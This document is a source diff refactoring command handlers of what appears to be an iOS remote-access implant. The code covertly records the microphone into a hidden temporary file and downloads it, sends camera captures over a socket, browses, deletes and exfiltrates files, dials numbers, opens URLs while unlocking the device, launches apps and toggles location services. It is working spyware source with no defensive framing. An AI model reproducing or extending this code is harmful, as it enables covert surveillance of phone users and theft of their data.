@@ -72,7 +72,6 @@ int sockfd;
     __block BOOL done = NO;
     [self captureWithBlock:^(NSData *imageData) {
         done = YES;
-        printf("image data length = %lu\n",(unsigned long)imageData.length);
         [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)imageData.length]];
         [self sendEncryptedFile:imageData];
     }];
@@ -157,13 +156,13 @@ int sockfd;
 
 //MARK: Mic
 
--(void)mic:(NSArray *)args {
-    NSString *usage = @"Usage: mic start|stop";
-    if (args.count == 1) {
+-(void)mic:(NSString *)arg {
+    NSString *usage = @"Usage: mic record|stop";
+    if ([arg isEqualToString:@""]) {
         [self sendString:usage];
         return;
     }
-    if ([[self forgetFirst:args] isEqual:@"start"]) {
+    if ([arg isEqual:@"record"]) {
         [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
         
         NSString *destinationString = @"/tmp/.esmic.aac";
@@ -181,10 +180,10 @@ int sockfd;
         [recorder record];
         [self sendString:@"Listening..."];
     }
-    else if ([[self forgetFirst:args] isEqual:@"stop"]) {
+    else if ([arg isEqualToString:@"stop"]) {
         if ([recorder isRecording]) {
             [recorder stop];
-            [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.esmic.aac", nil]];
+            [self download:@"/tmp/.esmic.aac"];
         }
         else {
             [self sendString:@"audio file not found"];
@@ -197,12 +196,12 @@ int sockfd;
 
 //MARK: File Management
 
--(void)directoryList:(NSArray *)args {
+-(void)directoryList:(NSString *)arg {
     //basically "ls"
     NSArray *files;
     NSString *dir = [_fileManager currentDirectoryPath];
-    if (args.count > 1) {
-        dir = [self forgetFirst:args];
+    if (![arg isEqualToString:@""]) {
+        dir = arg;
     }
     
     NSError *error = nil;
@@ -222,10 +221,10 @@ int sockfd;
     [self sendString:result];
 }
 
--(void)rmFile:(NSArray *)args {
+-(void)rmFile:(NSString *)arg {
     NSString *file = @"";
-    if (args.count > 1) {
-        file = [self forgetFirst:args];
+    if (![arg isEqualToString:@""]) {
+        file = arg;
     }
     else {
         [self sendString:@"Usage: rm filename"];
@@ -246,11 +245,11 @@ int sockfd;
     }
 }
 
--(void)changeWD:(NSArray *)args {
+-(void)changeWD:(NSString *)arg {
     //basically "cd"
     NSString *dir = NSHomeDirectory();
-    if (args.count > 1) {
-        dir = [self forgetFirst:args];
+    if (![arg isEqualToString:@""]) {
+        dir = arg;
     }
     BOOL isdir = false;
     if ([_fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
@@ -314,11 +313,11 @@ int sockfd;
     write(sockfd, [_terminator UTF8String], _terminator.length);
 }
 
--(void)download:(NSArray *)args {
+-(void)download:(NSString *)arg {
     @autoreleasepool {
         NSString *filepath = @"";
-        if (args.count > 1) {
-            filepath = [self forgetFirst:args];
+        if (![arg isEqualToString:@""]) {
+            filepath = arg;
         }
         BOOL isdir;
         if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
@@ -338,7 +337,7 @@ int sockfd;
 }
 
 
-
+/*
 -(void)encryptFile:(NSArray *)args {
     BOOL isdir;
     NSString *filepath = @"";
@@ -404,6 +403,7 @@ int sockfd;
         [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
     }
 }
+*/
 
 //MARK: Misc
 
@@ -485,11 +485,11 @@ int sockfd;
     CFUserNotificationGetResponseDictionary(notif);
 }
 
--(void)alert:(NSArray *)cmdarray {
+-(void)alert:(NSArray *)args {
     //our arguments were encoded in base64 so we can have multiple words in multiple arguments
-    NSData *titledata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , cmdarray[1]] options:0];
+    NSData *titledata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , args[0]] options:0];
     NSString *titlestring = [[NSString alloc] initWithData:titledata encoding:NSUTF8StringEncoding];
-    NSData *messagedata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , cmdarray[2]] options:0];
+    NSData *messagedata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , args[1]] options:0];
     NSString *messagestring = [[NSString alloc] initWithData:messagedata encoding:NSUTF8StringEncoding];
     //run in background! cool
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
@@ -504,16 +504,16 @@ int sockfd;
     [self sendString:[NSString stringWithFormat:@"%d",processID]];
 }
 
--(void)openURL:(NSArray *)args {
-    if ([args count] > 1) {
-        CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[args[1] UTF8String], strlen([args[1] UTF8String]), kCFStringEncodingUTF8, NULL);
+-(void)openURL:(NSString *)arg {
+    if (![arg isEqualToString:@""]) {
+        CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[arg UTF8String], strlen([arg UTF8String]), kCFStringEncodingUTF8, NULL);
         if(!cu) {
             [self sendString:@"Invalid URL"];
         }
         else {
             bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
             if (!ret) {
-                [self sendString:[NSString stringWithFormat:@"Error opening url %@",args[1]]];
+                [self sendString:[NSString stringWithFormat:@"Error opening url %@",arg]];
             }
             else {
                 [self blank];
@@ -525,20 +525,21 @@ int sockfd;
     }
 }
     
--(void)dial:(NSArray *)args {
-    if ([args count] > 1) {
-        [self openURL:[NSArray arrayWithObjects:@"", [NSString stringWithFormat:@"tel://%@",args[1]], nil]];
+-(void)dial:(NSString *)arg {
+    if (![arg isEqualToString:@""]) {
+        [self openURL:[NSString stringWithFormat:@"tel://%@",arg]];
     }
     else {
         [self sendString:@"Usage example: dial 5553334444"];
     }
 }
 
--(void)setVolume:(NSArray *)args {
-    if ([args count] > 1) {
+-(void)setVolume:(NSString *)arg {
+    //TODO: update
+    if (![arg isEqualToString:@""]) {
         #pragma GCC diagnostic push
         #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-        [[MPMusicPlayerController applicationMusicPlayer]setVolume:[args[1] floatValue]];
+        [[MPMusicPlayerController applicationMusicPlayer]setVolume:[arg floatValue]];
         #pragma GCC diagnostic pop
         [self blank];
     }
@@ -597,10 +598,10 @@ int sockfd;
     return [NSString stringWithFormat:@"Battery Level: %d ",batinfo];
 }
 
--(void)launchApp:(NSArray *)args {
-    if ([args count] >= 2) {
+-(void)launchApp:(NSString *)arg {
+    if (![arg isEqualToString:@""]) {
         int ret;
-        CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [args[1] UTF8String], kCFStringEncodingUTF8);
+        CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [arg UTF8String], kCFStringEncodingUTF8);
         assert(identifier != NULL);
         
         ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
@@ -694,22 +695,18 @@ int sockfd;
     [self sendString:replystr];
 }
 
--(void)locationService:(NSArray *)args {
+-(void)locationService:(NSString *)arg {
     NSString *howto = @"Usage example: locationservice off/locationservice on";
-    if ([args count] > 1) {
-        if ([args[1] isEqualToString: @"on"]) {
-            [self mcSendNoReply:@"locationon"];
-        }
-        else if ([args[1] isEqualToString: @"off"]) {
-            [self mcSendNoReply:@"locationoff"];
-        }
-        else {
-            [self sendString:howto];
-        }
+    if ([arg isEqualToString: @"on"]) {
+        [self mcSendNoReply:@"locationon"];
+    }
+    else if ([arg isEqualToString: @"off"]) {
+        [self mcSendNoReply:@"locationoff"];
     }
     else {
         [self sendString:howto];
     }
+
 }
 
 
